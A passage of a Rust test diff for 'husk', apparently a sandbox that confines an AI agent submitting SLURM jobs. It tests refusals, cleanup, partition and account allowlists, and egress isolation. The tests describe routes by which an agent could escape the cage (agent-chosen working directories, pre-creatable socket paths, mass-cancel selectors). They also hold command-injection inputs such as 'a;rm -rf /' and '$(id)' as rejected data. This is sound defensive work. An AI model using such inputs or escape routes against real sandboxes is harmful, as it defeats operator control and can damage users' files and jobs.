+        // SUBMIT time now — this asserts the run-time backstop independently, because a
+        // future specifier will arrive at exactly this branch.
+        for unmodelled in ["out-%J.log", "out%%x.log", "out-%Q.log"] {
+            // (a) ALONE. Nothing else in the loop is wrong, so the exit code by itself
+            //     separates "husk refused what it cannot name" from "husk excused it".
+            let block = emitted_name_check(&roots, &format!("{}/{unmodelled}", roots[0]), "");
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env());
+            assert_eq!(
+                rc, 1,
+                "an --output husk cannot expand ({unmodelled}) must refuse the job on its \
+                 own account. Exit 0 here is the fail-open branch: the body runs, its \
+                 stdout goes wherever slurmd resolves that name, outside the cage.\n{text}"
+            );
+            assert!(
+                text.contains("JOB REFUSED") && text.contains("cannot name the file"),
+                "the refusal must say WHY (P11); an unattributed one gets retried.\n{text}"
+            );
+
+            // (b) WITH a genuinely bad --error behind it. This is B1-1's exact shape: the
+            //     unmodelled path is FIRST in the loop, and at HEAD it set a flag the
+            //     caller spent on the NEXT iteration to `continue` past this refusal.
+            //     The exit code cannot tell the two apart here — the WHY can, and must.
+            let block = emitted_name_check(
+                &roots,
+                &format!("{}/{unmodelled}", roots[0]),
+                &format!("{}/e.log", roots[0]),
+            );
+            let _ = std::fs::remove_file(&log);
+            let (rc, text) = run_name_check(&block, &log, &guard_env());
+            assert_eq!(rc, 1, "the job must still be refused\n{text}");
+            assert!(
+                text.contains("cannot name the file"),
+                "husk must refuse on the FIRST path it cannot verify, not skip it and \
+                 happen to catch the second — that difference is the whole of B1-1, and \
+                 only the WHY line shows it.\n{text}"
+            );
+        }
+
+        // …and the plain A1-F1 refusal still fires when --output is fine and --error is not.
+        let block = emitted_name_check(
+            &roots,
+            &format!("{}/slurm-%j.out", roots[0]),
+            &format!("{}/e.log", roots[0]),
+        );
+        let _ = std::fs::remove_file(&log);
+        let (rc, text) = run_name_check(&block, &log, &guard_env());
+        assert_eq!(rc, 1, "the symlinked --error leaf must still be refused\n{text}");
+        assert!(text.contains("final component is a symlink"), "{text}");
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn the_reclaim_removes_only_what_husk_created() {
+        // THE ONLY TEST OF THE RECLAIM'S BEHAVIOUR. The goldens pin its TEXT; a reviewer
+        // proved they pin nothing else — deleting the whole block, or dropping the `-s`
+        // emptiness guard, failed only the two byte-snapshots and then shipped fully green
+        // through the documented `HUSK_UPDATE_GOLDEN=1` bless step. `-s` is the single guard
+        // standing between this cleanup and a user's real file (P9: the mutation is the test).
+        //
+        // Runs the EMITTED pre/post shell verbatim, extracted from the generated guard, with a
+        // stand-in for bwrap that creates mount points exactly as bwrap does (`creat` for a
+        // /dev/null bind, `mkdir` for a tmpfs). Real bwrap was verified by hand against the
+        // same three properties; what needs pinning here is husk's OWNERSHIP rule, not
+        // bwrap's, and a stub keeps this runnable where bwrap is absent (P10: say what the
+        // harness substitutes).
+        let guard = normalized_guard(true);
+        let pre = guard
+            .split("# --- husk: remember which mask targets do not exist yet")
+            .nth(1)
+            .and_then(|t| t.split("seccomp-wrapper").next())
+            .expect("the guard must carry the record block");
+        let post = guard
+            .split("# --- husk: reclaim the mount points husk itself created")
+            .nth(1)
+            .and_then(|t| t.split("# The step-broker holds").next())
+            .expect("the guard must carry the reclaim block");
+
+        let dir = std::env::temp_dir().join(format!("husk-reclaim-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let w = dir.to_string_lossy().to_string();
+
+        // Three files at mask paths, covering the three cases that matter.
+        std::fs::write(dir.join(".Rprofile"), "REAL USER CONTENT\n").unwrap(); // pre-existing
+        // .Renviron absent  -> husk creates it -> must be reclaimed
+        // .claude   absent  -> husk creates it -> must be reclaimed
+        // .Renviron-like decoy that becomes NON-EMPTY during the job -> must survive
+
+        let script = format!(
+            "set -u\ncd {w}\n\
+             _husk_masks=('{w}/.Rprofile' '{w}/.Renviron' '{w}/.decoy' '{w}/.claude')\n\
+             {pre_body}\n\
+             # REAL bwrap if it is here — the mount points must be the ones bwrap actually\n\
+             # makes, not the ones this test imagines. Falls back to a stand-in elsewhere,\n\
+             # and SAYS which ran, so a green result never hides that it proved less (P10).\n\
+             if command -v bwrap >/dev/null 2>&1 && \\\n\
+                bwrap --ro-bind / / --bind {w} {w} \\\n\
+                      --ro-bind-try /dev/null {w}/.Renviron \\\n\
+                      --ro-bind-try /dev/null {w}/.decoy \\\n\
+                      --tmpfs {w}/.claude -- /bin/true 2>/dev/null; then\n\
+               echo HUSK_TEST_ORACLE=real-bwrap\n\
+             else\n\
+               echo HUSK_TEST_ORACLE=stub\n\
+               for _p in \"${{_husk_masks[@]}}\"; do\n\
+                 case \"$_p\" in *.claude) mkdir -p \"$_p\" ;; *) [ -e \"$_p\" ] || : > \"$_p\" ;; esac\n\
+               done\n\
+             fi\n\
+             # A path husk recorded as ABSENT that gains CONTENT before the reclaim runs —\n\
+             # a concurrent writer in the same directory, which is the only way the `-s`\n\
+             # guard is ever reached. `chmod` first because REAL bwrap leaves its mount\n\
+             # points at 0444: with the stub the plain write appeared to work, and that\n\
+             # difference is exactly what a stub cannot show you.\n\
+             chmod u+w {w}/.decoy 2>/dev/null || true\n\
+             printf 'SOMEONE ELSE WROTE THIS\\n' > {w}/.decoy\n\
+             {post}\n",
+            w = w,
+            // Drop the comment tail and the emitter's own _husk_masks= line: the test supplies
+            // its own list of paths, but must run husk's REAL record and reclaim loops.
+            pre_body = pre
+                .lines()
+                .skip(1)
+                .filter(|l| !l.trim_start().starts_with("_husk_masks="))
+                .collect::<Vec<_>>()
+                .join("\n"),
+            post = post.split_once('\n').map(|(_, rest)| rest).unwrap_or(post),
+        );
+        let out = std::process::Command::new("bash").arg("-c").arg(&script).output().unwrap();
+        assert!(out.status.success(), "reclaim script failed: {out:?}");
+        let oracle = String::from_utf8_lossy(&out.stdout);
+        assert!(
+            oracle.contains("HUSK_TEST_ORACLE="),
+            "the test must declare which oracle it ran against: {oracle}"
+        );
+
+        assert!(
+            dir.join(".Rprofile").exists()
+                && std::fs::read_to_string(dir.join(".Rprofile")).unwrap().contains("REAL USER"),
+            "a PRE-EXISTING file was bound over, not created by husk — it must survive untouched"
+        );
+        assert!(
+            !dir.join(".Renviron").exists(),
+            "an empty mount point husk created must be reclaimed, or it shadows ~/.Renviron for \
+             the next human in this directory (A4-S3)"
+        );
+        assert!(
+            !dir.join(".claude").exists(),
+            "a tmpfs mount point husk created must be reclaimed too — R4 measured a leftover .hg"
+        );
+        assert!(
+            dir.join(".decoy").exists(),
+            "a path husk created but that gained CONTENT must survive: the emptiness guard is the \
+             only thing separating this cleanup from deleting a real file"
+        );
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn golden_guard_with_egress() {
+        check_golden("guard-net-on.sh", &normalized_guard(true));
+    }
+
+    // The snapshot only means something if it is the script that actually runs. Pin the two
+    // properties that make it so, in case a future edit normalises away something real.
+    #[test]
+    fn the_golden_guard_is_the_real_script_with_only_paths_normalised() {
+        let g = normalized_guard(true);
+        assert!(g.contains("<HUSK_BROKER>"), "the broker path must be normalised: {g}");
+        assert!(g.contains("seccomp-wrapper --profile=single-node bwrap"), "{g}");
+        assert!(g.contains("--unshare-net"), "the cage args must survive verbatim: {g}");
+        assert!(g.contains("--unshare-pid"), "the job cage must carry its pid namespace: {g}");
+        // Nothing machine-specific may leak into a committed file.
+        assert!(!g.contains(env!("CARGO_MANIFEST_DIR")), "a build path leaked into the golden file");
+    }
+
+    /// `RAB3-B3`. The pin for the lock in `normalized_guard`, AT THE LEVEL OF THE DEFECT:
+    /// the normaliser must observe ONE broker path, not two.
+    ///
+    /// **The false friend is the test directly above.**
+    /// `the_golden_guard_is_the_real_script_with_only_paths_normalised` is what went red at
+    /// `5dddfc0` — six release-profile runs out of six on this box — but it cannot pin
+    /// anything: it is green under `--test-threads=1` with the bug fully present, and its
+    /// redness depends on which unrelated test happens to be running beside it. A flake is a
+    /// symptom, never a contract (`P9`). Both byte-goldens are false friends for the same
+    /// reason, and so is `--test-threads=1`, which does not fix the race, it removes the
+    /// concurrency that exposes it.
+    ///
+    /// This test is DETERMINISTICALLY GREEN with the fix: the flipper obeys the same
+    /// protocol the real setter does — it only ever touches `BROKER_OVERRIDE` while holding
+    /// `STUB_PATH_LOCK` — so once `normalized_guard` holds that lock, the flipper cannot run
+    /// between its two reads at all. Remove the `_serialise` line and the flipper runs
+    /// thousands of times inside the window instead: measured 20/20 red.
+    #[test]
+    fn the_golden_normaliser_reads_one_broker_path_not_two() {
+        use std::sync::atomic::{AtomicBool, Ordering};
+        static STOP: AtomicBool = AtomicBool::new(false);
+        STOP.store(false, Ordering::SeqCst);
+
+        // Two paths that are neither a prefix of the other nor of the derived stub/socat
+        // paths, plus `None` (the real exe), so every value the flipper installs is a
+        // non-empty path the substitution CAN remove. If the normaliser reads one value and
+        // substitutes another, `<HUSK_BROKER>` is simply absent.
+        let flipper = std::thread::spawn(|| {
+            const PATHS: [Option<&str>; 3] = [
+                Some("/opt/husk-alpha/bin/husk-slurm-broker"),
+                Some("/opt/husk-bravo/bin/husk-slurm-broker"),
+                None,
+            ];
+            // Bounded as well as flagged: a test that can hang is a test nobody runs.
+            for i in 0..2_000_000usize {
+                if STOP.load(Ordering::Relaxed) {
+                    break;
+                }
+                {
+                    let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+                    *BROKER_OVERRIDE.lock().unwrap_or_else(|e| e.into_inner()) =
+                        PATHS[i % PATHS.len()].map(|p| p.to_string());
+                }
+                // Outside the lock, so the reader is not starved by a tight loop.
+                std::thread::yield_now();
+            }
+            let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+            // Leave the global exactly as every other test expects to find it.
+            *BROKER_OVERRIDE.lock().unwrap_or_else(|e| e.into_inner()) = None;
+        });
+
+        let mut misses = 0usize;
+        for _ in 0..64 {
+            if !normalized_guard(true).contains("<HUSK_BROKER>") {
+                misses += 1;
+            }
+        }
+        STOP.store(true, Ordering::SeqCst);
+        flipper.join().unwrap();
+        assert_eq!(
+            misses, 0,
+            "the golden normaliser read BROKER_OVERRIDE twice and got two different answers \
+             in {misses} of 64 runs: the script it built names one broker path and the \
+             substitution list names another, so `<HUSK_BROKER>` is missing and the goldens \
+             fail for a reason that is not in husk. The setter holds STUB_PATH_LOCK; the \
+             reader must hold it too."
+        );
+    }
+
+    // req.cwd is ADVERSARY-CONTROLLED: the stub is in the cage and the spool is
+    // agent-writable, so the agent can put any path in it. It is used as --chdir when the
+    // request sets none, and --output/--error are then confined RELATIVE TO IT. slurmd
+    // writes those files as the user and OUTSIDE the cage, which the threat model calls an
+    // uncaged arbitrary-write primitive — so if the base is agent-chosen, the confinement
+    // does not bind. This asserts the property that must hold: the job may only start, and
+    // write its logs, inside the region husk actually makes writable.
+    #[test]
+    fn an_agent_chosen_cwd_cannot_place_job_output_outside_the_writable_set() {
+        let outside = std::env::temp_dir().join(format!("husk-outside-{}", std::process::id()));
+        std::fs::create_dir_all(&outside).unwrap();
+        let proj = std::env::temp_dir().join(format!("husk-proj-{}", std::process::id()));
+        std::fs::create_dir_all(&proj).unwrap();
+
+        let d = decide(
+            &req_in(&outside, &["--partition=preemptible"], "echo hi\n"),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),   // writable set is just the project dir
+            &proj,
+        );
+        match d {
+            Decision::Reject(_) => {} // refusing is a fine answer
+            Decision::Submit(sub) => {
+                let argv = sub.options.join(" ");
+                let outside_s = outside.display().to_string();
+                assert!(
+                    !argv.contains(&outside_s),
+                    "job output/chdir was placed in an agent-chosen directory OUTSIDE the \
+                     writable set — slurmd writes those AS THE USER and OUTSIDE the cage:\n\
+                     {argv}"
+                );
+            }
+            _ => panic!("unexpected decision"),
+        }
+        let _ = std::fs::remove_dir_all(&outside);
+        let _ = std::fs::remove_dir_all(&proj);
+    }
+
+    // The case Christoph flagged as the one never tried: a SECOND writable directory
+    // declared in settings.json, the agent cd-ing there, and submitting from it. That must
+    // WORK — allowWrite really does add writable regions — while a directory outside the
+    // set must not. Both halves, because a fix that only refuses is a fix that breaks the
+    // feature.
+    #[test]
+    fn a_job_may_be_submitted_from_any_declared_writable_dir_but_no_other() {
+        let extra = std::env::temp_dir().join(format!("husk-allowwrite-{}", std::process::id()));
+        std::fs::create_dir_all(&extra).unwrap();
+        let fs_policy = FsPolicy::unchecked_for_test()
+            .with_allow_write(vec![extra.display().to_string()]);
+
+        // Submitted from the declared allowWrite dir: accepted, and the job starts there.
+        let d = decide(
+            &req_in(&extra, &["--partition=preemptible"], "echo hi\n"),
+            &no_uenv(), &fs_policy, work(),
+        );
+        match d {
+            Decision::Submit(sub) => {
+                let argv = sub.options.join(" ");
+                assert!(
+                    argv.contains(&format!("--chdir={}", extra.display())),
+                    "a job submitted from a declared writable dir must start there: {argv}"
+                );
+                assert!(
+                    argv.contains(&format!("--output={}/slurm-%j.out", extra.display())),
+                    "and its logs must land there: {argv}"
+                );
+            }
+            Decision::Reject(why) => panic!("allowWrite dir must be usable as a submit dir: {why}"),
+            _ => panic!("unexpected"),
+        }
+
+        // An explicit --chdir into the declared dir is the same thing, and used to be
+        // refused: it was confined to the project dir alone, ignoring allowWrite.
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible", &format!("--chdir={}", extra.display())], "echo hi\n"),
+            &no_uenv(), &fs_policy, work(),
+        );
+        assert!(matches!(d, Decision::Submit(_)), "--chdir into an allowWrite dir must be allowed");
+
+        // ...and anywhere else is refused, naming what IS writable.
+        let outside = std::env::temp_dir().join(format!("husk-notallowed-{}", std::process::id()));
+        std::fs::create_dir_all(&outside).unwrap();
+        match decide(&req_in(&outside, &["--partition=preemptible"], "echo hi\n"), &no_uenv(), &fs_policy, work()) {
+            Decision::Reject(why) => {
+                assert!(why.contains("writable set"), "explain the rule: {why}");
+                assert!(why.contains(&extra.display().to_string()), "name what IS writable: {why}");
+            }
+            _ => panic!("a submit dir outside the writable set must be refused"),
+        }
+        let _ = std::fs::remove_dir_all(&extra);
+        let _ = std::fs::remove_dir_all(&outside);
+    }
+
+    // A real cluster is not homogeneous: it has GPU nodes and CPU-only
+    // postprocessing nodes (`pp-short`), and which one a job needs is a hardware fact only
+    // the job knows. husk bounds the SET; the job picks from it. The bytes that reach
+    // sbatch are still husk's — the allowlist entry, never the request's copy of it.
+    #[test]
+    fn a_job_may_choose_any_allowed_partition_and_nothing_else() {
+        let multi = Session {
+            allowed_partitions: vec!["short".into(), "pp-short".into()],
+            ..no_uenv()
+        };
+        for want in ["short", "pp-short"] {
+            let argv = opts(
+                req_in(work(), &[&format!("--partition={want}")], "echo hi\n"),
+                &multi,
+            );
+            assert!(
+                argv.contains(&format!("--partition={want}")),
+                "{want} is allowed here and must be honoured: {argv:?}"
+            );
+        }
+
+        // Not in the set: refused, and the message names every partition that IS.
+        let d = decide(
+            &req_in(work(), &["--partition=normal"], "echo hi\n"),
+            &multi, &FsPolicy::unchecked_for_test(), work(),
+        );
+        let Decision::Reject(why) = d else { panic!("an unlisted partition must be refused") };
+        assert!(why.contains("short") && why.contains("pp-short"), "name the whole set: {why}");
+        assert!(why.contains("husk"), "attribute the restriction: {why}");
+        assert!(why.contains("availability"), "authorization is not availability: {why}");
+
+        // Multi-valued is refused rather than half-honoured: `--partition=a,b` is valid
+        // sbatch (the scheduler picks), which would make the hardware choice implicit again.
+        let d = decide(
+            &req_in(work(), &["--partition=short,pp-short"], "echo hi\n"),
+            &multi, &FsPolicy::unchecked_for_test(), work(),
+        );
+        let Decision::Reject(why) = d else { panic!("a multi-valued partition must be refused") };
+        assert!(why.contains("exactly one"), "{why}");
+
+        // Still byte-identical on retry — what makes a refusal read as standing policy.
+        let again = match decide(
+            &req_in(work(), &["--partition=normal"], "echo hi\n"),
+            &multi, &FsPolicy::unchecked_for_test(), work(),
+        ) { Decision::Reject(w) => w, _ => panic!("must reject") };
+        assert_eq!(why_of(&multi), again, "the refusal changed between identical requests");
+    }
+
+    fn why_of(s: &Session) -> String {
+        match decide(
+            &req_in(work(), &["--partition=normal"], "echo hi\n"),
+            s, &FsPolicy::unchecked_for_test(), work(),
+        ) { Decision::Reject(w) => w, _ => panic!("must reject") }
+    }
+
+    /// The job may select uenv images from the operator's set — and only from it.
+    ///
+    /// Third instance of select-from-a-set, and the one where being wrong is worst: a uenv is
+    /// mounted before husk's cage is built, so the image is the floor the cage stands on.
+    /// What makes that safe is not the validator but the SHAPE — the job names a label, husk
+    /// emits its own copy of the allowlist entry, and there is no syntax in which a file can
+    /// be named at all.
+    #[test]
+    fn a_job_selects_uenvs_from_the_operator_set_and_husk_emits_its_own_copy() {
+        let s = Session {
+            allowed_uenvs: vec!["prgenv-gnu/24.11:v1".into(), "icon/25.2".into()],
+            ..no_uenv()
+        };
+
+        // One listed image: husk's entry is emitted, with NO mount point — uenv then uses the
+        // image's own metadata mount, which is the compatible answer and keeps the job from
+        // choosing where it lands.
+        let o = opts(
+            req_in(work(), &["--partition=preemptible", "--uenv=icon/25.2"], "echo hi\n"),
+            &s,
+        );
+        assert!(o.contains(&"--uenv=icon/25.2".to_string()), "{o:?}");
+        assert!(
+            !o.iter().any(|a| a.starts_with("--uenv=") && a.matches(":/").count() > 0),
+            "husk must not emit a mount point: {o:?}"
+        );
+
+        // A LIST, because --uenv is one. Both elements resolved separately.
+        let o = opts(
+            req_in(work(), &["--partition=preemptible", "--uenv=icon/25.2,prgenv-gnu/24.11:v1"], "echo hi\n"),
+            &s,
+        );
+        assert!(o.contains(&"--uenv=icon/25.2,prgenv-gnu/24.11:v1".to_string()), "{o:?}");
+
+        // An unlisted image is refused, naming the set — authorization, not availability.
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible", "--uenv=evil"], "echo hi\n"),
+            &s, &FsPolicy::unchecked_for_test(), work(),
+        );
+        match d {
+            Decision::Reject(w) => {
+                assert!(w.contains("prgenv-gnu/24.11:v1") && w.contains("icon/25.2"), "name the set: {w}");
+                assert!(!w.contains("does not exist"), "authorization, not availability: {w}");
+            }
+            _ => panic!("an unlisted uenv must be refused"),
+        }
+
+        // A mount point is the job choosing a filesystem location. Refused, not stripped.
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible", "--uenv=icon/25.2:/user-environment"], "echo hi\n"),
+            &s, &FsPolicy::unchecked_for_test(), work(),
+        );
+        assert!(matches!(d, Decision::Reject(_)), "a job-supplied mount point must be refused");
+
+        // With NO set configured, nothing changes: the old refusal still holds.
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible", "--uenv=anything"], "echo hi\n"),
+            &no_uenv(), &FsPolicy::unchecked_for_test(), work(),
+        );
+        assert!(matches!(d, Decision::Reject(_)), "no set configured -> the job may not choose");
+    }
+
+    /// `--view` is the first agent-supplied value in this family, so its charset is a boundary.
+    #[test]
+    fn a_job_view_is_charset_bounded_and_reemitted() {
+        let s = Session { allowed_uenvs: vec!["icon/25.2".into()], ..no_uenv() };
+        let o = opts(
+            req_in(work(), &["--partition=preemptible", "--uenv=icon/25.2", "--view=default"], "echo hi\n"),
+            &s,
+        );
+        assert!(o.contains(&"--view=default".to_string()), "{o:?}");
+
+        for bad in ["a b", "a;rm -rf /", "../x", ".hidden", "a:b:c", "$(id)"] {
+            let d = decide(
+                &req_in(work(), &["--partition=preemptible", "--uenv=icon/25.2", &format!("--view={bad}")], "echo hi\n"),
+                &s, &FsPolicy::unchecked_for_test(), work(),
+            );
+            assert!(matches!(d, Decision::Reject(_)), "--view={bad:?} must be refused");
+        }
+    }
+
+    // Santis rejects EVERY submission without a project account (its cli_filter says so),
+    // and the account decides which project is BILLED — so the set is operator config and
+    // the job selects from it, exactly as with partitions.
+    //
+    // This test used to assert that an agent-named account was silently overridden with the
+    // operator's one. That was safe and wrong: with several accounts configured, quietly
+    // billing the first when someone asked for the second charges the wrong project and is
+    // discovered at month end. The security property is unchanged and still asserted here —
+    // bytes the agent supplied never reach sbatch — but it is now kept by REFUSING an
+    // account husk was not given, not by substituting one behind the user's back.
+    #[test]
+    fn the_account_is_selected_from_the_operator_set_never_supplied_by_the_agent() {
+        let two = Session {
+            allowed_accounts: vec!["csstaff".into(), "s83".into()],
+            ..no_uenv()
+        };
+
+        // An account husk was never given is REFUSED, and its bytes never reach sbatch.
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible", "-A", "evil"], "echo hi\n"),
+            &two, &FsPolicy::unchecked_for_test(), work(),
+        );
+        match d {
+            Decision::Reject(w) => {
+                assert!(!w.contains("does not exist"), "authorization, not availability: {w}");
+                assert!(w.contains("csstaff") && w.contains("s83"), "name the set: {w}");
+                assert!(w.contains("~/.husk/config.json"), "name where the fix is made: {w}");
+                assert!(!w.contains("install-husk.sh"), "not the seed-only flag: {w}");
+            }
+            _ => panic!("an unlisted account must be refused"),
+        }
+
+        // A LISTED account is honoured — this is the whole point of the change, and the
+        // emitted bytes are husk's copy of the allowlist entry, never the request's.
+        let argv = opts(
+            req_in(work(), &["--partition=preemptible", "-A", "s83"], "echo hi\n"),
+            &two,
+        );
+        assert!(argv.contains(&"--account=s83".to_string()), "{argv:?}");
+
+        // Naming none bills the first, and with a real choice available husk SAYS so.
+        let sub = match decide(
+            &req_in(work(), &["--partition=preemptible"], "echo hi\n"),
+            &two, &FsPolicy::unchecked_for_test(), work(),
+        ) { Decision::Submit(s) => s, _ => panic!("expected Submit") };
+        assert!(sub.options.contains(&"--account=csstaff".to_string()), "{:?}", sub.options);
+        assert!(sub.note.contains("csstaff"), "a defaulted account must be announced: {}", sub.note);
+
+        // With ONE configured account there was no choice to announce, so no note.
+        let one = Session { allowed_accounts: vec!["csstaff".into()], allowed_uenvs: vec![], ..no_uenv() };
+        let sub = match decide(
+            &req_in(work(), &["--partition=preemptible"], "echo hi\n"),
+            &one, &FsPolicy::unchecked_for_test(), work(),
+        ) { Decision::Submit(s) => s, _ => panic!("expected Submit") };
+        assert!(sub.options.contains(&"--account=csstaff".to_string()), "{:?}", sub.options);
+        assert!(!sub.note.contains("bills csstaff"), "no choice, no nag: {}", sub.note);
+
+        // A site with no account configured keeps today's behaviour: nothing emitted.
+        let argv = opts(
+            req_in(work(), &["--partition=preemptible"], "echo hi\n"),
+            &no_uenv(),
+        );
+        assert!(!argv.iter().any(|a| a.starts_with("--account")), "{argv:?}");
+
+        // ...but if the agent ASKED for one and husk has none, say who fixes it. Silently
+        // dropping it loops: the site refuses for want of an account, the agent supplies
+        // one, husk drops it, repeat.
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible", "--account=x"], "echo hi\n"),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        );
+        match d {
+            Decision::Reject(why) => {
+                // Name WHERE the fix is made, and it must be the place that still works.
+                // This asserted `--slurm-account` until 2026-08-19, which had become the
+                // seed-only installer flag: an operator following that message with a config
+                // file present gets "the config file OVERRIDES them" and is no closer.
+                assert!(why.contains("~/.husk/config.json"), "name where the fix is made: {why}");
+                assert!(
+                    !why.contains("install-husk.sh"),
+                    "must not send the operator to the seed-only flag: {why}"
+                );
+                assert!(why.contains("billed"), "say why it is operator config: {why}");
+            }
+            _ => panic!("an unconfigured account request must be explained, not dropped"),
+        }
+    }
+
+    // scancel exists so an agent can STOP what it started — husk brokered sbatch and not
+    // scancel, which left a runaway needing a human. The security content is entirely in
+    // what is REFUSED: a bare job id names one thing husk can check against what it
+    // submitted, while a selector is resolved by slurmctld against jobs husk cannot see.
+    #[test]
+    fn scancel_takes_job_ids_and_refuses_every_selector() {
+        let cancel = |argv: &[&str]| {
+            let mut r = req_in(work(), &[], "");
+            r.tool = "scancel".into();
+            r.argv = argv.iter().map(|s| s.to_string()).collect();
+            decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work())
+        };
+
+        match cancel(&["4991406", "4991406_3", "4991406.0"]) {
+            Decision::Cancel(ids) => assert_eq!(ids.len(), 3, "{ids:?}"),
+            _ => panic!("plain job ids must be cancellable"),
+        }
+
+        // The mass-cancel family. `scancel -u $USER` would kill every job this human owns,
+        // including production runs husk never submitted — the single worst thing this
+        // feature could enable, so each spelling is pinned.
+        for argv in [
+            vec!["-u", "hpcuser"], vec!["--user=hpcuser"], vec!["--me"],
+            vec!["-A", "acct"], vec!["--account=acct"], vec!["--state=PENDING"],
+            vec!["-p", "short"], vec!["--partition=short"], vec!["-n", "myjob"],
+            vec!["--name=myjob"], vec!["4991406", "--me"],
+        ] {
+            match cancel(&argv) {
+                Decision::Reject(why) => assert!(
+                    why.contains("not permitted here") || why.contains("at least one job id"),
+                    "{argv:?} refused with an unhelpful message: {why}"
+                ),
+                _ => panic!("{argv:?} must be refused"),
+            }
+        }
+
+        // Not ids, and a bare scancel (which in some spellings means "everything").
+        for argv in [vec![], vec!["all"], vec!["../4991406"], vec!["4991406;rm -rf /"], vec!["-"]] {
+            assert!(
+                matches!(cancel(&argv), Decision::Reject(_)),
+                "{argv:?} must be refused"
+            );
+        }
+    }
+
+    // husk forces every job onto one partition; on a preemptible one anything from another
+    // partition interrupts it. That is what keeps an agent from blocking the machine, and
+    // its cost is partial output. A model that does not checkpoint (ICON with
+    // lrestart = .FALSE.) leaves a directory that looks like a finished run, so an agent
+    // reading it can report that the science ran — worse, for a weather service, than an
+    // escape. The exit status already says 143, but nobody reading an output DIRECTORY
+    // sees an exit status.
+    #[test]
+    fn a_job_ended_by_a_signal_says_its_output_is_incomplete() {
+        let script = wrap_script(
+            BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", false,
+            &["/work".to_string()],
+            "", "",
+        );
+        // The trap is load-bearing twice over: an UNTRAPPED SIGTERM kills the guard shell
+        // outright, so the message never prints AND none of the cleanup below it runs —
+        // the step spool leaked on every preempted job before this existed.
+        assert!(script.contains("trap '_husk_signalled=SIGTERM' TERM"), "{script}");
+        let warn = script
+            .split_once("TERMINATED EARLY")
+            .map(|(_, r)| r)
+            .expect("a signalled job must be told its output is incomplete");
+        // Both places a human or an agent looks: the job's own stderr and husk's job log.
+        assert!(warn.contains("tee -a \"$_husk_log\""), "the warning must reach the husk job log: {warn}");
+        assert!(warn.contains(">&2"), "the warning must reach the job's stderr: {warn}");
+        // Name the consequence, and the specific way it misleads.
+        assert!(warn.contains("lrestart"), "name the non-checkpointing case: {warn}");
+        assert!(warn.contains("sacct"), "give the command that settles it: {warn}");
+        // Do NOT claim "preempted": SLURM sends SIGTERM for preemption, the wall limit and
+        // scancel alike, and confidently naming the wrong cause is the mistake husk keeps
+        // having to fix.
+        let head = &script[..script.find("TERMINATED EARLY").unwrap()];
+        assert!(
+            !head.contains("echo \"husk: THIS JOB WAS PREEMPTED"),
+            "the guard cannot tell preemption from a wall limit or scancel"
+        );
+        // 137 (SIGKILL) as well as 143: a job past GraceTime is killed outright.
+        assert!(script.contains("\"$_husk_rc\" = 137"), "{script}");
+    }
+
+    #[test]
+    fn the_egress_socket_directory_is_unguessable_so_it_cannot_be_pre_created() {
+        // **O1.** Connecting to an AF_UNIX socket needs only WRITE permission on the file,
+        // and permission does not distinguish two sessions of the SAME user — so an
+        // ownership test cannot be the boundary between them. The old name was exactly
+        // `/tmp/husk-<uid>-<jobid>`, and job ids are public in squeue: predictable BEFORE
+        // it existed. A same-uid actor could pre-create it for an expected job id, pass the
+        // `-O` check honestly (it really is that uid's directory), and keep a handle on the
+        // path each rank later resolves.
+        //
+        // `mktemp -d` makes the directory ours because we CREATED it, not because it looked
+        // like ours: atomic, unguessable, 0700, and it fails rather than adopting a path
+        // that already exists.
+        let on = wrap_script(BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", true, &["/work".to_string()], "", "");
+        assert!(
+            on.contains("mktemp -d \"/tmp/husk-") && on.contains("-XXXXXX\""),
+            "the egress socket dir must be created unguessably: {on}"
+        );
+        assert!(
+            !on.contains("mkdir -m 700 \"$_husk_net_dir\""),
+            "a predictable mkdir is pre-creatable by any same-uid process: {on}"
+        );
+        // The belt stays on: husk still refuses a directory it does not own, and the proxy
+        // re-checks owner and mode before it binds (check_socket_path). mktemp removes the
+        // race; it does not replace the check.
+        //
+        // ASSERTED AS THE CONTRACT, not as the string that used to carry it. This line read
+        // `on.contains("[ -O \"$_husk_net_dir\" ]")`, which went red when `FIX-D2` moved the
+        // one ownership predicate into `_husk_ours` and used it here — the contract held and
+        // the spelling did not. A red is evidence about the TEST as much as the change.
+        assert!(
+            on.contains("_husk_ours \"$_husk_net_dir\""),
+            "the egress socket directory must go through husk's one ownership gate: {on}"
+        );
+        assert!(
+            on.contains("[ -d \"$1\" ] && [ ! -L \"$1\" ] && [ -O \"$1\" ]"),
+            "…and that gate must still test ownership: {on}"
+        );
+    }
+
+    #[test]
+    fn egress_is_absent_unless_an_allowlist_was_configured() {
+        // With no allowlist a job keeps today's behaviour EXACTLY - --unshare-net and no
+        // route - and nothing is started to serve a policy that permits nothing. This is
+        // the default for every existing user, so it is the case worth pinning hardest.
+        let off = wrap_script(BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", false, &["/work".to_string()], "", "");
+        assert!(!off.contains("--net-proxy"), "no proxy without an allowlist: {off}");
+        assert!(!off.contains("HTTP_PROXY"), "no proxy env without an allowlist: {off}");
+        // ASSERTED AS THE CONTRACT, not as the string that used to carry it, and this one
+        // is the sharper case of that lesson: the line read `!off.contains("HUSK_NET_SOCK")`
+        // and it went red on `K-1`, which CLOSES the hole the line looks like it is about.
+        //
+        // Absence of the name was never the contract — `B4-3` is precisely a net-off job
+        // reaching the step broker with an inherited HUSK_NET_SOCK, and this assertion was
+        // green throughout. The contract is that with no allowlist nothing SETS a socket
+        // path and nothing binds one, which is what these two lines say; the third says the
